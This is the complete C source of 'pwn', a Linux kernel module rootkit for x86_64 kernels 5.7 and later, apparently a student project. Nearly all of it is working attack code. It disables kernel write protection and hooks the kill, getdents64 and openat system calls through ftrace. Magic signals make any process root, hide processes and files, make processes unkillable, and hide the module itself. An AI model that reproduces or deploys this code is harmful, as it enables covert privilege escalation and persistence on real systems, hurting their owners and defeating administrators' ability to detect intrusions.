/*
 * pwn: A linux kernel module rootkit
 *
 * Copyright (c) 2025 Joshua Poole <joshpoole6@gmail.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <linux/kprobes.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <asm/paravirt.h>
#include <linux/slab.h>
#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/rwlock.h>
#include <linux/rcupdate.h>
#include <linux/sched/signal.h>
#include <linux/uidgid.h>
#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/mount.h>
#include <linux/user_namespace.h>
#include <linux/time.h>
#include <linux/ktime.h>

//***************************************************** Module Info ****************************************************
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Joshua Poole");
MODULE_DESCRIPTION("LKM rootkit");
MODULE_VERSION("0.2");

// name of rootkit
#define KIT_NAME "pwn"

// We can hide these files
#define MAGIC_FILE "MAGIC_FILE"

// rootkit can hide itself
#define PROJECT_DIR "something-awesome"
//======================================================================================================================

//***************************************************** Definitions ****************************************************
// Codes for signals that are given to sys_kill to do *special* things
#define SIGROOT     64      // make a process root
#define SIGUSER     63      // make a process user mode
#define SIGINVS     62      // make a process invisible
#define SIGVSBL     61      // make a process visible
#define SIGIMRT     60      // make a process immortal
#define SIGMRTL     59      // make a process mortal
#define SIGHDMD     58      // hide the kernel module
#define SIGUNHM     57      // unhide the kernel module
#define SIGTOGF     56      // toggle hidden files

// max number of hidden files / immortal processes at once
#define MAX_HIDDEN_FILES    256
#define MAX_IMMORTAL_PIDS   256
//======================================================================================================================

//************************************ Check correct architecture and kernel version ***********************************
#ifndef CONFIG_X86_64
#error Only x86_64 architecture is supported
#endif

#if (LINUX_VERSION_CODE < KERNEL_VERSION(5, 7, 0))
#error Only supports kernel version >=5.7.0
#endif
//======================================================================================================================

//******************************************** Read-only memory protection *********************************************
// The following functions were adapted from those found on:
// https://jm33.me/we-can-no-longer-easily-disable-cr0-wp-write-protection.html
static inline void write_cr0_forced(unsigned long val) {
    unsigned long __force_order;

    /* __asm__ __volatile__( */
    asm volatile("mov %0, %%cr0": "+r"(val), "+m"(__force_order));
}

#define X86_CR0_WP 0x10000

static inline void enable_write_protection(void) {
    preempt_enable();
    write_cr0_forced(read_cr0() | X86_CR0_WP);
}

static inline void disable_write_protection(void) {
    preempt_disable();
    write_cr0_forced(read_cr0() & (~X86_CR0_WP));
}
//======================================================================================================================

//*************************************************** Util functions ***************************************************
// These utils are taken from https://github.com/croemheld/lkm-rootkit/tree/master
struct data_node {
	/* pointer to data */
	void *data;
	/* list to previous and next entry */
	struct data_node *prev, *next;
};

static struct data_node *insert_data_node(struct data_node **head, void *data) {
	struct data_node *node = kmalloc(sizeof(struct data_node), GFP_KERNEL);
	node->data = data;

	node->prev = NULL;
	node->next = (*head);

	if((*head) != NULL) (*head)->prev = node;
	(*head) = node;

	return (*head);
}

static void delete_data_node(struct data_node **head, struct data_node *node) {
	if(*head == NULL || node == NULL) return;
	if(*head == node) *head = node->next;

	if(node->next != NULL) node->next->prev = node->prev;
	if(node->prev != NULL) node->prev->next = node->next;

	kfree(node);
}

static struct data_node *find_data_node_field(struct data_node **head, void *needle, int offset, int length) {
	struct data_node *node = *head;

	while(node != NULL) {
		if(!memcmp(node->data + offset, needle, length)) {
			return node;
		}
		node = node->next;
	}

	return NULL;
}
//======================================================================================================================

//***************************************** Functions for privilege escalation *****************************************
// A lot of these functions were adapted from https://github.com/croemheld/lkm-rootkit/tree/master
struct task_struct *real_init = NULL;
struct data_node *creds = NULL;
struct cred_node {
	int pid;
	struct task_struct *task, *parent, *real_parent;
	kuid_t uid, suid, euid, fsuid;
	kgid_t gid, sgid, egid, fsgid;
};
rwlock_t cred_lock;
unsigned long cred_flags;

static int priv_escalation_init(void) {
	real_init = pid_task(find_get_pid(1), PIDTYPE_PID);
	return 0;
}

static void init_task_adopt(struct task_struct *task, struct cred_node *node) {
	node->parent = task->parent;
	node->real_parent = task->real_parent;

	write_lock_irqsave(&cred_lock, cred_flags);

	/* real_parent is now the init task */
	task->real_parent = real_init;

	/* adopting from kernel/exit.c */
	if(!task->ptrace)
		task->parent = real_init;

	/*
	 * current task was adopted by init, so he has new siblings
	 * we need to remove the task from his own siblings list and
	 * insert it to the init childrens siblings list
	 */
	list_move(&task->sibling, real_init->children.next);
	write_unlock_irqrestore(&cred_lock, cred_flags);
}

static void init_task_disown(struct cred_node *node) {
	write_lock_irqsave(&cred_lock, cred_flags);

	/* reversion of init_task_adopt */
	node->task->parent = node->parent;
	node->task->real_parent = node->real_parent;

	list_move(&node->task->sibling, node->parent->children.next);
	write_unlock_irqrestore(&cred_lock, cred_flags);
}

static void insert_cred(struct task_struct *task) {
	struct cred *pcred;

	struct cred_node *cnode = kmalloc(sizeof(struct cred_node), GFP_KERNEL);

	cnode->pid = task->pid;
	cnode->task = task;

	disable_write_protection();
	rcu_read_lock();

	/* get process creds */
	pcred = (struct cred *)task->cred;

	/* backing up original values */
	cnode->uid = pcred->uid;
	cnode->euid = pcred->euid;
	cnode->suid = pcred->suid;
	cnode->fsuid = pcred->fsuid;
	cnode->gid = pcred->gid;
	cnode->egid = pcred->egid;
	cnode->sgid = pcred->sgid;
	cnode->fsgid = pcred->fsgid;

	/* escalate to root */
	pcred->uid.val = pcred->euid.val = 0;
	pcred->suid.val = pcred->fsuid.val = 0;
	pcred->gid.val = pcred->egid.val = 0;
	pcred->sgid.val = pcred->fsgid.val = 0;

	/* make process adopted by init */
	init_task_adopt(task, cnode);

	/* finished reading */
	rcu_read_unlock();
	enable_write_protection();

	insert_data_node(&creds, (void *)cnode);
}

static void remove_cred(struct data_node *node){
	struct cred *pcred;

	/* get node */
	struct cred_node *cnode = (struct cred_node *)node->data;

	disable_write_protection();
	rcu_read_lock();

	pcred = (struct cred *)cnode->task->cred;

	/* deescalate */
	pcred->uid = cnode->uid;
	pcred->euid = cnode->euid;
	pcred->suid = cnode->suid;
	pcred->fsuid = cnode->fsuid;
	pcred->gid = cnode->gid;
	pcred->egid = cnode->egid;
	pcred->sgid = cnode->sgid;
	pcred->fsgid = cnode->fsgid;

	/* make process child of its real parent again */
	init_task_disown(cnode);

	/* finished reading */
	rcu_read_unlock();
	enable_write_protection();
	kfree(cnode);
}

static void process_escalate(int pid) {
	struct task_struct *task = pid_task(find_get_pid(pid), PIDTYPE_PID);

	if(find_data_node_field(&creds, (void *)&pid, offsetof(struct cred_node, pid), sizeof(pid)) == NULL && task != NULL)
		insert_cred(task);
}

static void process_deescalate(int pid) {
	struct data_node *node = find_data_node_field(&creds, (void *)&pid, offsetof(struct cred_node, pid), sizeof(pid));

	if(node != NULL) {
		remove_cred(node);
		delete_data_node(&creds, node);
	}
}
//======================================================================================================================

//************************************ Use kprobes to get into kallsyms_loopup_name ************************************
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t kallsyms_lookup_name_fn;
//======================================================================================================================

//******************************************* Prototypes for hooked syscalls *******************************************
static asmlinkage long hook_kill(const struct pt_regs *regs);
static asmlinkage long hook_getdents64(const struct pt_regs *regs);
static asmlinkage long hook_openat(const struct pt_regs *regs);

typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);

static ptregs_t orig_kill;
static ptregs_t orig_getdents64;
static ptregs_t orig_openat;
//======================================================================================================================

//************************************** Definitions and array for holding hooks ***************************************
/* Note: The following hooking mechanism utilising ftrace was used heavily from the ftrace-hook project - see:
https://github.com/ilammy/ftrace-hook */
struct ftrace_hook {
    const char *name;
    void *function;
    void *original;
    unsigned long address;
    struct ftrace_ops ops;
};

#define SYSCALL_NAME(name) ("__x64_" name)

#define HOOK(_name, _function, _original)	\
	{										\
		.name = SYSCALL_NAME(_name),		\
		.function = (_function),			\
		.original = (_original),			\
	}

// a global variable to store our hooked syscall structs
static struct ftrace_hook hooks[] = {
    HOOK("sys_kill", hook_kill, &orig_kill),
    HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("sys_openat", hook_openat, &orig_openat),
};
//======================================================================================================================

//************************************** Functions for installing/removing hooks ***************************************
/* Note: The following hooking mechanism utilising ftrace was used heavily from the ftrace-hook project - see:
https://github.com/ilammy/ftrace-hook */
static int fh_resolve_hook_address(struct ftrace_hook *hook) {
    hook->address = kallsyms_lookup_name_fn(hook->name);

    if (!hook->address) {
        printk(KERN_INFO "error: unknown symbol: %s\n", hook->name);
        return -ENOENT;
    }

    *((ptregs_t*)hook->original) = (ptregs_t)hook->address;

    return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                   struct ftrace_ops *ops, struct ftrace_regs *fregs) {
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    if (!within_module(parent_ip, THIS_MODULE)) {
        regs->ip = (unsigned long)hook->function;
    }
}

static int fh_install_hook(struct ftrace_hook *hook) {
    int err;

    err = fh_resolve_hook_address(hook);
    if (err) return err;

    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                    | FTRACE_OPS_FL_RECURSION
                    | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }

    return 0;
}

static void fh_remove_hook(struct ftrace_hook *hook) {
    int err;

    err = unregister_ftrace_function(&hook->ops);
    if (err) {
        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err) {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    }
}

static int fh_install_hooks(struct ftrace_hook *hooks, size_t count) {
    int err;
    size_t i;

    for (i = 0; i < count; i++) {
        err = fh_install_hook(&hooks[i]);
        if (err)
            goto error;
    }
    return 0;

error:
    while (i != 0) {
        fh_remove_hook(&hooks[i]);
        i--;
    }
    return err;
}

static void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) {
    size_t i;

    for (i = 0; i < count; i++) {
        fh_remove_hook(&hooks[i]);
    }
}
//======================================================================================================================

//**************************************************** Hiding files ****************************************************
static int hiding_files = 1;

static void toggle_file_visibility(void) {
    hiding_files = !hiding_files;
}

static char *hidden_files[MAX_HIDDEN_FILES] = {
    MAGIC_FILE,
    PROJECT_DIR,
    // KIT_NAME,   // having this bugs out lsmod so don't use it
    NULL
};

static int add_hidden_file(const char *filename) {
    for (int i = 0; i < MAX_HIDDEN_FILES - 1; i++) {
        if (hidden_files[i] == NULL) {
            hidden_files[i] = kmalloc(strlen(filename) + 1, GFP_KERNEL);
            if (!hidden_files[i]) {
                return -ENOMEM;
            }
            strcpy(hidden_files[i], filename);
            hidden_files[i + 1] = NULL;
            return 0;
        }
    }
    return -ENOMEM;
}

static void remove_hidden_file(const char *filename) {
    for (int i = 0; i < MAX_HIDDEN_FILES; i++) {
        if (hidden_files[i] && strcmp(hidden_files[i], filename) == 0) {
            kfree(hidden_files[i]);
            for (int j = i; j < MAX_HIDDEN_FILES - 1; j++) {
                hidden_files[j] = hidden_files[j + 1];
            }
            hidden_files[MAX_HIDDEN_FILES - 1] = NULL;
            return;
        }
    }
}

static int should_hide_file(const char *filename) {
    for (int i = 0; hidden_files[i]; i++) {
        if (strstr(filename, hidden_files[i])) {
            return 1;
        }
    }
    return 0;
}

// helper function for hooked getdents64 syscall to hide any files / dirs we want hidden
// This is adapted from: https://github.com/ait-aecid/caraxes/
static __always_inline int filter_files(struct linux_dirent __user * dirent, int res, int fd) {
	int err;
	unsigned long off = 0;
	struct kstat *stat = kzalloc(sizeof(struct kstat), GFP_KERNEL);
	int user;
	int group;
	struct linux_dirent64 *dir, *kdir, *kdirent, *prev = NULL;

	kdirent = kzalloc(res, GFP_KERNEL);
	if (kdirent == NULL) return res;

	err = copy_from_user(kdirent, dirent, res);
	if (err) goto out;

    typedef int (*vfs_fstatat_t)(int, const char __user *, struct kstat *, int);
    static vfs_fstatat_t vfs_fstatat_ptr;
    vfs_fstatat_ptr = (vfs_fstatat_t)kallsyms_lookup_name_fn("vfs_fstatat");

	while (off < res) {
		kdir = (void *)kdirent + off;
		dir = (void *)dirent + off;
		err = vfs_fstatat_ptr(fd, dir->d_name, stat, 0);
		if (err) goto out;
		user = (int)stat->uid.val;
		group = (int)stat->gid.val;
        if (hiding_files && should_hide_file(kdir->d_name)) {
            printk(KERN_INFO "rootkit: hooked getdents to block %s\n", kdir->d_name);
			if (kdir == kdirent) {
				res -= kdir->d_reclen;
				memmove(kdir, (void *)kdir + kdir->d_reclen, res);
				continue;
			}
			prev->d_reclen += kdir->d_reclen;
		} else {
			prev = kdir;
		}
		off += kdir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, res);
	if (err) goto out;

	out:
		kfree(stat);
		kfree(kdirent);
	return res;
}

//======================================================================================================================

//************************************************** Hiding processes **************************************************
static void process_hide(int pid) {
    struct task_struct *target_task = pid_task(find_get_pid(pid), PIDTYPE_PID);
    if (!target_task) return;

    disable_write_protection();
    list_del_init(&target_task->tasks);
    enable_write_protection();

    char pid_str[16];
    snprintf(pid_str, sizeof(pid_str), "%d", pid);
    add_hidden_file(pid_str);
}

static void process_unhide(int pid) {
    struct task_struct *target_task = pid_task(find_get_pid(pid), PIDTYPE_PID);

    disable_write_protection();
    list_add(&target_task->tasks, &init_task.tasks);
    enable_write_protection();

    char pid_str[16];
    snprintf(pid_str, sizeof(pid_str), "%d", pid);
    remove_hidden_file(pid_str);
}
//======================================================================================================================

//********************************************** Make processes immortal ***********************************************
static int immortal_pids[MAX_IMMORTAL_PIDS];
static size_t num_immortal_pids = 0;

static int is_immortal(int pid) {
    for (int i = 0; i < num_immortal_pids; i++) {
        if (immortal_pids[i] == pid) {
            return 1;
        }
    }
    return 0;
}

static void make_immortal(int pid) {
    if (is_immortal(pid)) return;

    if (num_immortal_pids < MAX_IMMORTAL_PIDS) {
        immortal_pids[num_immortal_pids++] = pid;
    }
}

static void make_mortal(int pid) {
    for (int i = 0; i < num_immortal_pids; i++) {
        if (immortal_pids[i] == pid) {
            for (int j = i; j < num_immortal_pids - 1; j++) {
                immortal_pids[j] = immortal_pids[j + 1];
            }
            num_immortal_pids--;
            break;
        }
    }
}
//======================================================================================================================

//********************************************* Hide module from the kernel ********************************************
struct list_head *prev_module = NULL;
static int is_hidden = 0;

static void hide_module(void) {
    if (is_hidden) return;

    prev_module = THIS_MODULE->list.prev;

    list_del(&THIS_MODULE->list);
    is_hidden = 1;
}

static void unhide_module(void) {
    if (!is_hidden) return;

    list_add(&THIS_MODULE->list, prev_module);
    prev_module = NULL;
    is_hidden = 0;
}
//======================================================================================================================

//*************************************************** Hooked syscalls **************************************************
// Hooks sys_kill: Used for killing processes. By using signals, we can also do a lot of cool things like immortal
// processes, process escalation, hiding processes, and hiding the kernel module
static asmlinkage long hook_kill(const struct pt_regs *regs) {
    int pid = regs->di;
    int sig = regs->si;

    if (sig < SIGTOGF && is_immortal(pid)) {
        printk(KERN_INFO "rootkit: immortal process: pid = %d cannot be killed\n", pid);
        return 0;
    }

    switch (sig) {
        case SIGROOT:
            printk(KERN_INFO "rootkit: SIGROOT received - make process with pid = %d root\n", pid);
            process_escalate(pid);
            return 0;

        case SIGUSER:
            printk(KERN_INFO "rootkit: SIGUSER received - make process with pid = %d user\n", pid);
            process_deescalate(pid);
            return 0;

        case SIGINVS:
            printk(KERN_INFO "rootkit: SIGINVS received - hide process with pid = %d\n", pid);
            process_hide(pid);
            return 0;

        case SIGVSBL:
            printk(KERN_INFO "rootkit: SIGVSBL received - unhide process with pid = %d\n", pid);
            process_unhide(pid);
            return 0;

        case SIGIMRT:
            printk(KERN_INFO "rootkit: SIGIMRT received - process with pid = %d should now be immortal\n", pid);
            make_immortal(pid);
            return 0;

        case SIGMRTL:
            printk(KERN_INFO "rootkit: SIGMRTL received - process with pid = %d should now be mortal\n", pid);
            make_mortal(pid);
            return 0;

        case SIGHDMD:
            printk(KERN_INFO "rootkit: SIGHDMD received - hiding kernel module\n");
            hide_module();
            return 0;

        case SIGUNHM:
            printk(KERN_INFO "rootkit: SIGUNHM received - unhiding kernel module\n");
            unhide_module();
            return 0;

        case SIGTOGF:
            printk(KERN_INFO "rootkit: SIGTOGF received - toggling files to be %d (0 = visible, 1 = hidden)\n",
                !hiding_files);
            toggle_file_visibility();
            return 0;

        default:
            return orig_kill(regs);
    }
}


// Hooks the getdents64 syscall, which is used to read directory entries from an open directory
// We can hook this syscall to not display files or directories which we want to hide
static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
    unsigned int fd = regs->di;
    struct linux_dirent __user *dirent = (struct linux_dirent __user *)regs->si;

    int ret = orig_getdents64(regs);
    if (ret <= 0) return ret;


    ret = filter_files(dirent, ret, fd);

    return ret;
}

// Hooks the openat syscall, which is used to open / create files
// We can hook this syscall to stop opening of files or directories we want to hide
static asmlinkage long hook_openat(const struct pt_regs *regs) {
    const char __user *filename = (const char __user *)regs->si;

    char kernel_filename[256];
    int copied = strncpy_from_user(kernel_filename, filename, 255);

    if (copied > 0) {
        kernel_filename[255] = '\0';

        if (should_hide_file(kernel_filename)) {
            printk(KERN_INFO "rootkit: hooked openat to block access to %s\n", kernel_filename);
            return -ENOENT;
        }

    }

    return orig_openat(regs);
}
//======================================================================================================================

//************************************************** initialise module *************************************************
static int __init rootkit_init(void) {
    int err = register_kprobe(&kp);
    if (err < 0) return err;

    kallsyms_lookup_name_fn = (kallsyms_lookup_name_t)kp.addr;

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        unregister_kprobe(&kp);
        return err;
    }

    priv_escalation_init();
    // hide_module();           // This is commented by default for debugging purposes
    return 0;
}
//======================================================================================================================

//***************************************************** exit module ****************************************************
static void __exit rootkit_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    unregister_kprobe(&kp);
}
//======================================================================================================================

module_init(rootkit_init);
module_exit(rootkit_exit);
